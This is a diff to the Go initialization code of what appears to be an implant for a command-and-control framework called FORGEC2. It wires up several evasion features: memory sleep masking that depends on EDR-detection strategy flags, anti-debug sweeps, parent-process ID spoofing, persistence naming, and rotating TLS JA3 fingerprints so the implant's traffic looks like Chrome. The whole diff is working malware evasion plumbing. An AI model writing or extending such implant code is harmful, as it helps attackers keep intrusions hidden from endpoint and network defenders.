@@ -20,9 +20,6 @@ import (
 
 func init() {
 	setDPIAware()
-	if InitSleepMask() {
-		sleepMaskActive = true
-	}
 
 	// Start EDR monitor on init
 	startEdrMonitor()
@@ -137,8 +134,16 @@ func init() {
 
 	// Adaptive EDR detection + early anti-debug sweep. All of this plumbing
 	// (evasion strategy flags, anti-debug hooks) is windows-only; the linux
-	// stub is a harmless no-op.
+	// stub is a harmless no-op. This must run before the sleep-mask decision
+	// below: enableSleepMask is one of the strategy flags it sets.
 	applyAdaptiveEvasion()
+
+	// Sleep mask: initialize the platform infrastructure, then honor the EDR
+	// strategy's opt-in. An operator-set mask (set_sleep_mask task) activates
+	// it independently at runtime.
+	if InitSleepMask() && sleepMaskPolicyEnabled() {
+		activateSleepMask()
+	}
 
 	ppidSpoofEnabled = strings.ToLower(PPIDSpoofStr) == "true" || PPIDSpoofStr == "1"
 	if v := os.Getenv("FORGEC2_PPID_SPOOF"); v == "1" || strings.ToLower(v) == "true" {
@@ -157,9 +162,17 @@ func init() {
 	egressDetection = strings.ToLower(EgressDetectionStr) == "true" || EgressDetectionStr == "1"
 
 	chameleonProfile = ChameleonProfileStr
+	if v := os.Getenv("FORGEC2_CHAMELEON_PROFILE"); v != "" {
+		chameleonProfile = v
+	}
 	if chameleonProfile == "" {
 		chameleonProfile = "random"
 	}
+	chameleonEnabled := strings.ToLower(ChameleonStr) == "true" || ChameleonStr == "1"
+	if v := os.Getenv("FORGEC2_CHAMELEON"); v == "1" || strings.ToLower(v) == "true" {
+		chameleonEnabled = true
+	}
+	initJA3Rotation(chameleonProfile, chameleonEnabled)
 
 	persistencePrefix = PersistencePrefixStr
 	if persistencePrefix == "" {
@@ -267,8 +280,9 @@ func init() {
 	}
 
 	// All HTTPS egress uses the utls dialer so the ClientHello is a realistic,
-	// configurable fingerprint (Chrome Auto by default; the chameleon build
-	// rotates it) instead of the Go-stdlib stack.
+	// configurable fingerprint (stable Chrome Auto by default; per-dial JA3
+	// rotation when ChameleonStr / FORGEC2_CHAMELEON enables it) instead of
+	// the Go-stdlib stack.
 	tr := newUTLSTransport()
 	if ProxyStr != "" {
 		proxyURL, err := url.Parse(ProxyStr)
